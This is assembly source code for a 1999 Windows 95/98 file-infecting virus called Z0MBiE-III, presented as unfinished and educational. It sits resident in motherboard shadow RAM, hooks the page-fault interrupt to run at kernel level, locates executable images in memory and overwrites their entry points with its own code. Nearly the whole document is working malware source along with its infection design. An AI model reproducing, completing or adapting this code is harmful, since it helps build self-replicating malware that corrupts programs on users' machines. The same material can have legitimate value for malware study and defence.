
; Win9X.Z0MBiE-III
;                  /PROBABLY INTENDED, UNFINISHED VERSION,
;                           FOR EDUCATIONAL PURPOSES ONLY/

; programmed in March-1999, commented in May-1999
; homepage: z0mbie.cjb.net

; features:
;   - size ~420 bytes
;   - win95/98 ring0-tsr (shadowram, idt#0E) PE-infector
;   - no win32api, vxdcalls or any other system services used, pure x86 code
;
; kewl:
;   - infecting files in memory (only some files will flush to disk)

; system requirements:
;   - standard PCI motherboard (because of shadowram residency)
;   - win95/98


; on infected program start:
;
; - tsr
;     - calc new location in C000:xxxx
;     - check if alredy resident
;     - open shadowram
;     - copy virus
;     - hook INT 0E (page fault)
;     - close shadowram
; - go ring0
; - restore host
; - back to host
;
; on INT 0E called
;
; - handle/skip own errors
; - check if error CS.dpl = 3
; - take error address,
;   check if address is in range [00400000..90000000]
;   truncate it to 64k,
;   go back 64k-by-64k until 'MZ' will be found
; - now we have PE file, find section pointed by entrypointrva
; - check section flags, must be readonly
; - tempaddress = sectionstart + sectionphyssize - virussize
; - check if alredy infected
; - copy orig bytes from entrypoint to tempaddress
; - copy virus to entrypoint
;

DEBUG                   equ     PLEASE DONT FUCK ME

int                     macro   x
                        endm

include                 mz.inc
include                 pe.inc

                        p386
                        model   flat

                        locals  __
                        jumps

code                    segment dword public 'èàáÑÖñ' use32
                        assume  cs:code, ds:code, ss:code, es:code

xEDI                    equ     <-start[edi]>

start:

                        int 3

                        call    $+5             ; ESI = virus start
                        pop     esi
                        sub     esi, $-1-start

                        push    esi             ; ESI

                        cmp     [esp+4].byte ptr 3, 0BFh ; win9X ?
                        jne     tsr_complete

                        movzx   edi, byte ptr ds:[0C0002h] ; EDI = new offset
                        shl     edi, 9
                        add     edi, 0C0000h - ((virsize+15) and 0FFF0h) - 16

                        cmp     byte ptr [id_byte xEDI], 88h ; alredy tsr ?
id_byte                 equ     byte ptr $-1
                        je      tsr_complete

tsr:
                        int 3

                        call    c000_rw         ; make shadowram writeable

                        pusha                   ; copy code into shadowram
                        mov     ecx, virsize
                        cld
                        rep     movsb
                        popa

                        push    eax             ; get IDT base into ebx
                        push    eax
                        sidt    [esp+2]
                        pop     ebx
                        pop     ebx

                        lea     eax, int0E xEDI ; hook INT 0E
                        xchg    ax, [ebx+0Eh*8+0]
                        rol     eax, 16
                        xchg    ax, [ebx+0Eh*8+6]
                        rol     eax, 16
                        mov     old0E xEDI, eax

                        call    c000_ro         ; make shadowram readonly

tsr_complete:

                        int 3

                        pop     edi             ; EDI = virus start

                        lea     esi, [edi + C3-start]  ; ESI = orig data
save_disp               equ     dword ptr $-4

                        ;;

                        and     eax, [esi]      ; load page

                        mov     eax, 0F0000077h ; need to enter ring0
                        out     80h, al

                        cmp     eax, [eax]      ; call INT 0E

restore_program:        mov     al, 0FFh        ; now in ring0
                        out     80h, al

                        int 3

                        popa                    ; restore regs
                        popf
                        pop     eax             ; skip errorcode

                        push    edi

                        push    esi
                        mov     ecx, virsize
                        push    ecx
                        rep     movsb   ; copy saved orig bytes -> virus
                        xchg    ecx, eax
                        pop     ecx
                        pop     edi
                        rep     stosb   ; zero saved orig bytes

                        pop     eax     ; change EIP
                        mov     [esp], eax

                        iret            ; return to program

int0E:                  pushf
                        pusha

                        in      al, 80h

                        cmp     al, 88h         ; my error ?
                        je      __myerr

                        cmp     al, 77h
                        je      restore_program

                        call    $+5             ; install my-error handler
                        pop     ebp
                        sub     ebp, $-1-__fault

                        mov     al, 88h         ; enable my-error checking
                        out     80h, al

                        mov     eax, [esp+4+4+4*8].dword ptr 4 ; CS.dpl = 3 ?
                        and     al, 3
                        cmp     al, 3
                        jne     __exit

                        mov     edx, [esp+4+4+4*8].dword ptr 0 ; EIP
                        and     edx, 0FFFF0000h         ; align 64k

                        cmp     edx, 90000000h         ; max ?
                        jae     __exit

__cycle_1:              cmp     edx, 00400000h          ; min ?
                        jb      __exit

                        cmp     word ptr [edx], 'ZM'    ; EXE header ?
                        je      __mz

                        sub     edx, 10000h             ; 64k up
                        jmp     __cycle_1

__mz:

                IFDEF   DEBUG
                        cmp     [edx].dword ptr 007Ch, 'BM0Z'  ; debug
                        jne     __exit
                ENDIF

                        mov     esi, edx
                        add     esi, [esi].dword ptr 3Ch   ; ESI=pe header

                        movzx   edi, [esi].pe_ntheadersize ; EDI=pe objtable
                        lea     edi, [esi + 18h + edi]

    ; now find code section pointed by entrypointrva

                        movzx   ecx, [esi].pe_numofobjects ; ecx = N sections

                        mov     ebx, [esi].pe_entrypointrva; ebx = entrypoint

__cycle_2:              dec     ecx               ; cycle, for each section
                        js      __exit

                        mov     eax, [edi].oe_virt_rva     ; min
                        cmp     ebx, eax
                        jb      __cycle_2_next

                        add     eax, [edi].oe_phys_size    ; max
                        cmp     ebx, eax
                        jb      __cycle_2_exit

__cycle_2_next:         add     edi, size oe_struc         ; next section
                        jmp     __cycle_2

__cycle_2_exit:         test    byte ptr [edi].oe_flags+3, 80h ; writeable?
                        jnz     __exit

                        add     ebx, edx ; ebx=entrypoint+imagebase

                        add     eax, edx ; eax=endofsection+imagebase-virsize
                        sub     eax, virsize

                        xor     ecx, ecx
                        cmp     [eax], ecx ; 0 ?
                        jne     __exit

                        int 3

                        mov     cx, virsize

  ; check if fault occured in bytes i wanna move right now
                        mov     esi, [esp+4+4+4*8].dword ptr 0 ; EIP
                        cmp     esi, ebx
                        jb      __1
                        sub     esi, ecx
                        cmp     esi, ebx
                        jbe     __exit
__1:

                        mov     esi, ebx ; copy orig code to endofsection-...
                        mov     edi, eax
                        cld              ; no PUSH/POP available here !!!
                        rep     movsb

                        call    $+5           ; copy virus to entrypoint
                        pop     esi
                        sub     esi, $-1-start
                        mov     edi, ebx
                        mov     cx, virsize
                        rep     movsb

                        sub     eax, ebx
                        mov     save_disp -start[ebx], eax

__fault:
__exit:                 mov     al, 0FFh        ; disable my-error handling
                        out     80h, al

                        popa
                        popf

                        db      68h             ; return to original INT 0E
old0E                   dd      ?
                        ret

__myerr:                popa                    ; my-error handler
                        popf

                        lea     esp, [esp+4]    ; errorcode
                        mov     [esp], ebp
                        iret

;                       pop     eax             ; errorcode
;                       pop     eax             ; eip
;                       pop     eax             ; cs
;                       pop     eax             ; eflags
;                       jmp     ebp

; ---------------------------------------------------------------------------

                        db      'Z0MBiE-3'

; ---------------------------------------------------------------------------

c000_rw:                mov     ebx, 005A33CCh  ; C000, 32k - readwrite
                        jmp     cf8_io

c000_ro:                mov     ebx, 005A11CCh  ; C000, 32k - readonly

cf8_io:                 mov     eax, ebx        ; shadowram management
                        shr     eax, 16
                        or      eax, 80000000h
                        mov     cl, al
                        and     cl, 3
                        and     al, not 3
                        mov     dx, 0CF8h
                        out     dx, eax
                        add     dl, 4
                        add     dl, cl
                        in      al, dx
                        and     al, bl
                        or      al, bh
                        out     dx, al
                        ret

; ---------------------------------------------------------------------------

virend:
virsize                 equ     $-start

                        db      13,10
                        db      'virus size = '
                        if      (virsize/1000) ne 0
                        db      (virsize/1000) mod 10 + '0'
                        endif
                        if      (virsize/ 100) ne 0
                        db      (virsize/ 100) mod 10 + '0'
                        endif
                        db      (virsize/  10) mod 10 + '0'
                        db      (virsize/   1) mod 10 + '0'
                        db      13,10

; ---------------------------------------------------------------------------

C3                      db      virsize dup (0C3h)

code                    ends
                        end     start

